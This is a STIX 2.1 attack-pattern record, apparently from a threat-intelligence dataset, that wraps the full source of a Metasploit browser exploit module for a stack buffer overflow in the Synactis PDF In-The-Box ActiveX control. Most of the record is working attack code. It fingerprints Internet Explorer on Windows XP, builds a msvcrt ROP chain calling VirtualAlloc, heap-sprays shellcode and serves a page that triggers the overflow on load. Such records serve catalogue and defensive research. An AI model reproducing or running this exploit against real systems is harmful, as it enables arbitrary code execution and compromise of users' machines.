{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f5d2acf-d518-44a6-8a13-9f310a6a3bf0",
    "created": "2024-08-14T16:45:04.926357Z",
    "modified": "2024-08-14T16:45:04.926361Z",
    "name": "\"Synactis PDF In-The-Box ConnectToSynactic Stack Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Synactis' PDF In-The-Box ActiveX component, specifically PDF_IN_1.ocx.  When a long string of data is given to the ConnectToSynactis function, which is meant to be used for the ldCmdLine argument of a WinExec call, a strcpy routine can end up overwriting a TRegistry class pointer saved on the stack, resulting in arbitrary code execution under the context of the user.  Also note that since the WinExec function is used to call the default browser you must be aware that: 1) The default must be Internet Explorer, and 2) when the exploit runs, another browser will pop up.  Synactis PDF In-The-Box is also used by other software such as Logic Print 2013 which is how the vulnerability was found and publicly disclosed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/synactis_connecttosynactis_bof.rb",
            "external_id": "synactis_connecttosynactis_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"7.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :classid    => \"{C80CAF1F-C58E-11D5-A093-006097ED77E6}\",\n  #  :method     => \"ConnectToSynactis\",\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => AverageRanking\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Synactis PDF In-The-Box ConnectToSynactic Stack Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Synactis' PDF In-The-Box ActiveX\n        component, specifically PDF_IN_1.ocx.  When a long string of data is given\n        to the ConnectToSynactis function, which is meant to be used for the ldCmdLine\n        argument of a WinExec call, a strcpy routine can end up overwriting a TRegistry\n        class pointer saved on the stack, resulting in arbitrary code execution under the\n        context of the user.\n\n          Also note that since the WinExec function is used to call the default browser,\n        you must be aware that: 1) The default must be Internet Explorer, and 2) when the\n        exploit runs, another browser will pop up.\n\n          Synactis PDF In-The-Box is also used by other software such as Logic Print 2013,\n        which is how the vulnerability was found and publicly disclosed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'h1ch4m',\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '93754' ],\n          [ 'EDB', '25835' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Newer setups like Win + IE8: \"Object doesn't support this property or method\"\n          [ 'Automatic', {} ],\n          [\n            'IE 7 on Windows XP SP3', {'Eax' => 0x0c0c0c0c}\n          ],\n          [\n            # 0x20302020 = Where the heap spray will land\n            # 0x77c15ed5 = xchg eax,esp; rcr dword ptr [esi-75], 0c1h, pop ebp; ret 4\n            'IE 8 on Windows XP SP3',\n            { 'Rop' => :msvcrt, 'Pivot' => 0x77C218D3, 'Ecx' => 0x20302024, 'Eax' => 0x20302028 }\n          ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'StackAdjustment' => -3500\n        },\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-30',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_target(agent)\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      align  = \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n      # Must be null-byte-free for the spray\n        chain =\n        [\n          t['Pivot'],\n          0x41414141,\n          t['Ecx'],   # To ECX\n          0x77c1e844, # POP EBP # RETN [msvcrt.dll]\n          0x41414141,\n          0x77c1e844, # skip 4 bytes [msvcrt.dll]\n          0x77c4fa1c, # POP EBX # RETN [msvcrt.dll]\n          0xffffffff,\n          0x77c127e5, # INC EBX # RETN [msvcrt.dll]\n          0x77c127e5, # INC EBX # RETN [msvcrt.dll]\n          0x77c4e0da, # POP EAX # RETN [msvcrt.dll]\n          0x2cfe1467, # put delta into eax (-> put 0x00001000 into edx)\n          0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]\n          0x77c58fbc, # XCHG EAX,EDX # RETN [msvcrt.dll]\n          0x77c34fcd, # POP EAX # RETN [msvcrt.dll]\n          0x2cfe04a7, # put delta into eax (-> put 0x00000040 into ecx)\n          0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]\n          0x77c14001, # XCHG EAX,ECX # RETN [msvcrt.dll]\n          0x77c3048a, # POP EDI # RETN [msvcrt.dll]\n          0x77c47a42, # RETN (ROP NOP) [msvcrt.dll]\n          0x77c46efb, # POP ESI # RETN [msvcrt.dll]\n          0x77c2aacc, # JMP [EAX] [msvcrt.dll]\n          0x77c3b860, # POP EAX # RETN [msvcrt.dll]\n          0x77c1110c, # ptr to &VirtualAlloc() [IAT msvcrt.dll]\n          0x77c12df9, # PUSHAD # RETN [msvcrt.dll]\n          0x77c35459  # ptr to 'push esp #  ret ' [msvcrt.dll]\n        ].pack(\"V*\")\n\n        p = chain + align + code\n\n    else\n      p = \"\\x0c\" * 50 + code\n    end\n\n    p\n  end\n\n  def get_html(cli, req, target)\n    js_p = ::Rex::Text.to_unescape(get_payload(target, cli), ::Rex::Arch.endian(target.arch))\n    eax  = \"\\\\x\" + [target['Eax']].pack(\"V*\").unpack(\"H*\")[0].scan(/../) * \"\\\\x\"\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js_property_spray}\n\n    function r()\n    {\n      var s = unescape(\"#{js_p}\");\n      sprayHeap({shellcode:s});\n\n      var p1 = '';\n      var p2 = '';\n      eax = \"#{eax}\";\n\n      while (p1.length < 189)  p1 += \"\\\\x0c\";\n      while (p2.length < 7000) p2 += \"\\\\x0c\";\n\n      var obj = document.getElementById(\"obj\");\n      obj.ConnectToSynactis(p1+eax+p2);\n    }\n    </script>\n    </head>\n    <body OnLoad=\"r();\">\n    <OBJECT classid=\"clsid:C80CAF1F-C58E-11D5-A093-006097ED77E6\" id=\"obj\"></OBJECT>\n    </body>\n    </html>\n    |\n\n    html.gsub(/^ {4}/, '')\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    target = get_target(agent)\n    if target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target selected as: #{target.name}\")\n    send_response(cli, get_html(cli, request, target), {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-30",
    "x_mitre_platforms": [
        "win'"
    ]
}